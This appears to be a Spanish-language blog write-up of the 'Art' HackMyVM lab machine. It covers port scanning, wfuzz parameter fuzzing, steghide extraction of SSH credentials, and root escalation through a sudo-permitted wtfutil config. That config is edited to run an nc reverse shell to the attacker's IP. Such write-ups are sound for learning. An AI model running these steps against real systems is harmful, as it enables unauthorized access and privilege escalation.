---
layout: post
title: Art
date: 2022-12-02
categories: ["HMV", "Enumeration", "Steganography", "File Edit"]
thumbnail: "assets/images/Art.png"
---

# Art [ Hack The Box ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.108 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.108 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Si entramos a la página veremos una imagen y un texto (`SEE HMV GALLERY!`), si miramos el código de la página veremos un comentario que nos dice que necesita resolver el problema con el parámetro `tag`.

Si buscamos el archivo `index.php` veremos que es la misma página, por lo que con `GoBuster` buscaré por ficheros `PHP`. Tras unos minutos sin resultados decidí `fuzzear` los parámetros del `index.php`. Para ello utilicé `WFuzz`, una herramienta hecha en `Python`.

```
wfuzz -u "http://192.168.1.108/index.php?FUZZ=/etc/passwd" -w directory-list-2.3-medium.txt
```

Tras unos segundos veremos que sólo existe un parámetro, el `tag`. En este caso no hay `LFI`, pero podemos tratar de `fuzzear` a ver si encontramos un archivo con el parámetro `tag`. Para elo utilicé de nuevo `WFuzz`:

```
wfuzz -u "http://192.168.1.108/index.php?tag=FUZZ" -w directory-list-2.3-medium.txt
```

Tras unos segundos veremos tres resultados: `0`, `beauty` y `beautiful`. Si miramos `0` y `beautiful` nos muestran lo que ya habíamos visto, pero `beauty` nos muestra una imagen diferente, vamos a ver si oculta algo.

Para ello utilicé una herramienta llamada `StegHide`, la cual nos ayudará a encontrar mensajes ocultos en imágenes.

- `steghide extract -sf dsa32.jpg`

```
Enter passphrase:
wrote extracted data to "yes.txt".
```

Se nos creó un archivo llamado `yes.txt` con lo que la herramienta extrajo de la foto, vamos a ver qué es:

```
lion/shel0vesyou
```

Estupendo! Tenemos las credenciales de `Lion`!

### Subida de privilegios
Una vez nos hayamos conectado por `SSH` a la máquina como `Lion` querremos ser `root`, así que comencé por hacer `sudo -l` para listar lo que podía hacer en la máquina.

```
Matching Defaults entries for lion on art:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
```

Como vemos podemos ejecutar un binario llamado `wtfutil` como cualquier usuario, es decir, podemos ejecutarlo como `root`. Tras iniciarlo vemos un link al [`GitHub`](https://github.com/wtfutil/wtf) del creador y, ahí, podemos encontrar la herramienta.

Vemos que cuando la iniciamos se va a la carpeta personal del usuario que la inició y de ahí a una carpeta llamada `.config`. Dentro hay un archivo con el nombre de `config.yml`.

Si miramos el archivo veremos que va por módulos. El módulo `uptime` ejecuta en segundo plano un comando con unos argumentos, vamos a cambiarlos por una Reverse Shell con `NC`, para ello nos pondremos en escucha  en nuestra máquina por el puerto que queramos, en mi caso el `4444`.

- `nc -nlvp 4444`

Bien, ahora que lo tenemos preparado podemos cambiar las líneas `args` y `cmd` de nuestro archivo de configuración (`/home/lion/.config/config.yml`).

```
args: ['-e','/bin/bash','192.168.1.103','4444']
cmd: "nc"
```

Como vimos antes si ejecutamos la herramienta como `root` usará la configuración que tiene `root`, pero no hemos editado ese archivo (no tenemos permisos) pero sí hemos editado nuestro fichero. Para utilizar nuestro fichero tenemos que utilizar el parámetro `--config=` y especificar la configuración editada, en este caso está en `/home/lion/.config/config.yml`.

Bien! Tras iniciar la herramienta como `root` recibimos la Shell! Qué fácil!